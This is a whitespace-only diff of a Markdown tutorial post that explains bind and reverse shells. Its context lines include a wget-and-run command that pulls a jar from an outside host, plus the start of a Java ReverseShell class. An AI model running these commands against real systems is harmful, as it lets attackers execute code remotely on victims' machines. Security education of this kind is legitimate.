@@ -4,7 +4,7 @@ date: 2020-11-01 11:11:11 -0400
 categories: [31Linux, Sysadmin]
 tags: [Linux, Sysadmin]
 math: true
-image: 
+image:
 ---
 
 [toc]
@@ -13,27 +13,27 @@ image:
 
 # Bind shell
 
-Bind shell 
-- attacker's machine acts as a client 
-- victim's machine acts as a server opening up a communication port on the victim and waiting for the client to connect to it 
-- and then attacker issue commands that will be remotely executed on the victim's machine. 
+Bind shell
+- attacker's machine acts as a client
+- victim's machine acts as a server opening up a communication port on the victim and waiting for the client to connect to it
+- and then attacker issue commands that will be remotely executed on the victim's machine.
 
 > This would be only possible if the victim's machine has a public IP and is accessible over the internet (disregarding all firewall etc. for the sake of brevity).
 
 
 what if the victim's machine is NATed and hence not directly reachable ?
-- attacker's machine is reachable. 
-- So attacker open a server and let the victim connect to him. 
-- This is what a reverse shell is. 
+- attacker's machine is reachable.
+- So attacker open a server and let the victim connect to him.
+- This is what a reverse shell is.
 
 ---
 
 # reverse shell
 
-Reverse Shell 
-- attacker's machine (has a public IP and is reachable over the internet) acts as a server. 
-- It opens a communication channel on a port and waits for incoming connections. 
-- Victim's machine acts as a client and initiates a connection to the attacker's listening server. 
+Reverse Shell
+- attacker's machine (has a public IP and is reachable over the internet) acts as a server.
+- It opens a communication channel on a port and waits for incoming connections.
+- Victim's machine acts as a client and initiates a connection to the attacker's listening server.
 
 Open two tabs in your terminal.
 1. open TCP port 8080 and wait for a connection:
@@ -101,8 +101,8 @@ wget http://1.1.1.1:9999/revs.jar -O /tmp/revs1.jar;
 
 java -jar /tmp/revs1.jar;
 
-import java.io.IOException;    
-public class ReverseShell {    
+import java.io.IOException;
+public class ReverseShell {
     public static void main(String[] args) throws IOException, InterruptedException {
         // TODO Auto-generated method stub
         Runtime r = Runtime.getRuntime();
